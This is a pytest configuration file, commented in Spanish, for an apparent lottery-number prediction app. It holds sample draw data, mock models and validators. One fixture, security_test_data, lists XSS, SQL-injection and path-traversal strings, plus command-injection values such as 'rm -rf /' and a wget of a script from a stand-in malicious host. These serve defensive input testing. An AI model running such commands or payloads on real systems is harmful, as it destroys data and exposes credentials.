#!/usr/bin/env python3
"""
🧪 Pytest Configuration - Configuración Central de Testing
"""

import pytest
import pandas as pd
import numpy as np
from pathlib import Path
import json
import tempfile
import shutil
from unittest.mock import Mock
from typing import Dict, List, Any

# Configurar path para importaciones
import sys
sys.path.insert(0, str(Path(__file__).parent.parent))

@pytest.fixture(scope="session")
def test_data_dir():
    """Directorio temporal para datos de testing"""
    temp_dir = tempfile.mkdtemp(prefix="omega_test_")
    yield Path(temp_dir)
    shutil.rmtree(temp_dir)

@pytest.fixture
def sample_historical_data():
    """Datos históricos de muestra para testing"""
    np.random.seed(42)  # Reproducible
    
    data = []
    for i in range(100):
        combination = sorted(np.random.choice(range(1, 41), 6, replace=False))
        data.append({
            'fecha': f'2025-01-{i+1:02d}',
            'bolilla_1': combination[0],
            'bolilla_2': combination[1],
            'bolilla_3': combination[2],
            'bolilla_4': combination[3],
            'bolilla_5': combination[4],
            'bolilla_6': combination[5]
        })
    
    return pd.DataFrame(data)

@pytest.fixture
def sample_predictions():
    """Predicciones de muestra para testing"""
    return [
        {
            'combination': [1, 15, 23, 31, 35, 40],
            'confidence': 0.85,
            'source': 'neural_enhanced',
            'svi_score': 0.75
        },
        {
            'combination': [3, 12, 19, 26, 33, 38],
            'confidence': 0.78,
            'source': 'transformer_deep',
            'svi_score': 0.68
        },
        {
            'combination': [7, 14, 21, 28, 35, 42],
            'confidence': 0.72,
            'source': 'lstm_v2',
            'svi_score': 0.71
        }
    ]

@pytest.fixture
def test_config():
    """Configuración de testing"""
    return {
        "system": {
            "app_name": "OMEGA PRO AI TEST",
            "version": "10.1-test",
            "environment": "testing",
            "debug": True,
            "log_level": "DEBUG"
        },
        "prediction": {
            "target_count": 3,  # Menor para testing
            "combo_length": 6,
            "number_range_min": 1,
            "number_range_max": 40,
            "svi_weight": 0.3,
            "confidence_weight": 0.7
        },
        "performance": {
            "enable_parallel_processing": False,  # Más simple para testing
            "max_workers": 2,
            "batch_size": 10,
            "cache_enabled": False,
            "lazy_loading": False
        }
    }

@pytest.fixture
def mock_model():
    """Modelo mock para testing"""
    mock = Mock()
    mock.predict.return_value = [
        {'combination': [1, 2, 3, 4, 5, 6], 'confidence': 0.8},
        {'combination': [7, 8, 9, 10, 11, 12], 'confidence': 0.7}
    ]
    mock.get_version.return_value = "1.0-test"
    mock.get_training_date.return_value = "2025-01-01"
    return mock

@pytest.fixture
def mock_data_service():
    """DataService mock"""
    mock = Mock()
    mock.load_and_prepare_data.return_value = []
    mock.calculate_svi_batch.return_value = [0.7, 0.8, 0.6]
    mock.get_health_status.return_value = "healthy"
    return mock

@pytest.fixture
def mock_ensemble_manager():
    """EnsembleManager mock"""
    mock = Mock()
    mock.get_active_models.return_value = ["neural_enhanced", "lstm_v2"]
    mock.get_model_weights.return_value = {"neural_enhanced": 0.6, "lstm_v2": 0.4}
    mock.get_health_status.return_value = "healthy"
    return mock

@pytest.fixture(scope="function")
def temporary_csv_file(sample_historical_data, test_data_dir):
    """Archivo CSV temporal con datos de muestra"""
    csv_path = test_data_dir / "test_historical.csv"
    sample_historical_data.to_csv(csv_path, index=False)
    return str(csv_path)

@pytest.fixture
def valid_combination():
    """Combinación válida para testing"""
    return [1, 15, 23, 31, 35, 40]

@pytest.fixture
def invalid_combinations():
    """Combinaciones inválidas para testing"""
    return [
        [1, 2, 3, 4, 5],  # Solo 5 números
        [1, 2, 3, 4, 5, 6, 7],  # 7 números
        [0, 1, 2, 3, 4, 5],  # Número fuera de rango (0)
        [1, 2, 3, 4, 5, 41],  # Número fuera de rango (41)
        [1, 1, 2, 3, 4, 5],  # Número duplicado
        ["a", "b", "c", "d", "e", "f"],  # No son números
    ]

@pytest.fixture(autouse=True)
def setup_test_environment(monkeypatch):
    """Configuración automática del entorno de testing"""
    # Variables de entorno para testing
    monkeypatch.setenv("OMEGA_ENV", "testing")
    monkeypatch.setenv("OMEGA_DEBUG", "true")
    monkeypatch.setenv("OMEGA_LOG_LEVEL", "DEBUG")

# Markers personalizados
def pytest_configure(config):
    """Configuración de markers personalizados"""
    config.addinivalue_line("markers", "unit: Marca tests unitarios")
    config.addinivalue_line("markers", "integration: Marca tests de integración")
    config.addinivalue_line("markers", "performance: Marca tests de performance")
    config.addinivalue_line("markers", "slow: Marca tests lentos")

# Funciones utilitarias para testing
def assert_valid_prediction(prediction: Dict[str, Any]):
    """Valida que una predicción tenga el formato correcto"""
    assert isinstance(prediction, dict)
    assert 'combination' in prediction
    assert 'confidence' in prediction
    assert isinstance(prediction['combination'], list)
    assert len(prediction['combination']) == 6
    assert all(1 <= n <= 40 for n in prediction['combination'])
    assert len(set(prediction['combination'])) == 6  # Sin duplicados
    assert 0 <= prediction['confidence'] <= 1

def assert_valid_predictions(predictions: List[Dict[str, Any]]):
    """Valida una lista de predicciones"""
    assert isinstance(predictions, list)
    assert len(predictions) > 0
    for prediction in predictions:
        assert_valid_prediction(prediction)

# Registrar funciones utilitarias globalmente
pytest.assert_valid_prediction = assert_valid_prediction
pytest.assert_valid_predictions = assert_valid_predictions

# Additional fixtures for comprehensive testing

@pytest.fixture(scope="session")
def test_database_url():
    """URL de base de datos para testing"""
    return "sqlite:///:memory:"

@pytest.fixture(scope="function")
def mock_all_models():
    """Mock all ML models for testing"""
    from unittest.mock import patch, MagicMock
    
    models_to_mock = [
        'modules.genetic_model.generar_combinaciones_geneticas',
        'modules.montecarlo_model.generar_combinaciones_montecarlo', 
        'modules.clustering_engine.generar_combinaciones_clustering',
        'modules.transformer_model.generar_combinaciones_transformer',
        'modules.apriori_model.generar_combinaciones_apriori',
        'modules.lstm_model.generar_combinaciones_lstm'
    ]
    
    mocks = {}
    patches = []
    
    for model_path in models_to_mock:
        mock = MagicMock()
        mock.return_value = [[1, 2, 3, 4, 5, 6], [7, 8, 9, 10, 11, 12]]
        
        try:
            patcher = patch(model_path, mock)
            patches.append(patcher)
            mocks[model_path] = patcher.start()
        except:
            pass
    
    yield mocks
    
    for patcher in patches:
        patcher.stop()

@pytest.fixture(scope="function")
def performance_monitor():
    """Performance monitoring fixture"""
    import time
    try:
        import psutil
        process = psutil.Process()
        start_time = time.time()
        start_memory = process.memory_info().rss / 1024 / 1024  # MB
        start_cpu = time.process_time()
        
        metrics = {
            'start_time': start_time,
            'start_memory': start_memory,
            'start_cpu': start_cpu,
            'process': process
        }
        
        yield metrics
        
        end_time = time.time()
        end_memory = process.memory_info().rss / 1024 / 1024  # MB
        end_cpu = time.process_time()
        
        metrics.update({
            'duration': end_time - start_time,
            'memory_delta': end_memory - start_memory,
            'cpu_time': end_cpu - start_cpu,
            'end_memory': end_memory
        })
    except ImportError:
        # If psutil is not available, provide basic timing
        start_time = time.time()
        metrics = {'start_time': start_time}
        
        yield metrics
        
        end_time = time.time()
        metrics.update({'duration': end_time - start_time})

@pytest.fixture(scope="function")
def mock_api_client():
    """Mock API client for testing"""
    mock_client = Mock()
    
    # Configure common API responses
    mock_client.get.return_value.status_code = 200
    mock_client.get.return_value.json.return_value = {"status": "ok"}
    
    mock_client.post.return_value.status_code = 200
    mock_client.post.return_value.json.return_value = {
        "predictions": [[1, 2, 3, 4, 5, 6]],
        "confidence": 0.85
    }
    
    return mock_client

@pytest.fixture(scope="function")
def security_test_data():
    """Security test data for various attack scenarios"""
    return {
        'xss_payloads': [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>"
        ],
        'sql_injection_payloads': [
            "1' OR '1'='1",
            "1; DROP TABLE users;",
            "' UNION SELECT * FROM passwords --",
            "1' AND (SELECT COUNT(*) FROM users) > 0 --"
        ],
        'path_traversal_payloads': [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "....//....//....//etc//passwd",
            "/var/log/../../etc/passwd"
        ],
        'command_injection_payloads': [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test || wget malicious.com/script.sh",
            "test `whoami`"
        ]
    }

# Enhanced pytest hooks
def pytest_collection_modifyitems(config, items):
    """Modify test collection to add markers based on file location"""
    for item in items:
        if "unit" in str(item.fspath):
            item.add_marker(pytest.mark.unit)
        elif "integration" in str(item.fspath):
            item.add_marker(pytest.mark.integration)
        elif "performance" in str(item.fspath):
            item.add_marker(pytest.mark.performance)
        elif "security" in str(item.fspath):
            item.add_marker(pytest.mark.security)

def pytest_runtest_setup(item):
    """Setup for each test"""
    # Skip GPU tests if GPU not available
    if item.get_closest_marker("gpu"):
        try:
            import torch
            if not torch.cuda.is_available():
                pytest.skip("GPU not available")
        except ImportError:
            pytest.skip("PyTorch not available for GPU testing")
    
    # Skip performance tests in CI if requested
    if item.get_closest_marker("performance"):
        import os
        if os.environ.get('SKIP_PERFORMANCE_TESTS'):
            pytest.skip("Performance tests skipped in CI")
    
    # Skip slow tests if requested
    if item.get_closest_marker("slow"):
        import os
        if os.environ.get('SKIP_SLOW_TESTS'):
            pytest.skip("Slow tests skipped")

def pytest_runtest_teardown(item, nextitem):
    """Cleanup after each test"""
    import gc
    gc.collect()